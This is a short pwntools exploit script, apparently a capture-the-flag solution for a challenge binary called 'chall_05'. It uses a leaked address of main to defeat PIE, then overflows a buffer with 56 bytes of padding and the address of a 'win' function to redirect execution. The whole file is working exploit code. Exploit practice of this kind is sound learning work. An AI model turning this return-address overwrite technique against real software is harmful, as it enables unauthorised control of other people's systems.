from pwn import *

binary = context.binary = ELF('./chall_05')

p = process("./chall_05")

p.sendlineafter('Race, life\'s greatest.\n','foobar')

p.recvuntil('Yes I\'m going to win: ')
_ = p.recvline().strip()
main = int(_,16)
binary.address = main - binary.sym.main
log.info('binary.address: ' + hex(binary.address))

payload  = b''
payload += 56 * b'A'
payload += p64(binary.sym.win)

p.sendline(payload)
p.interactive()
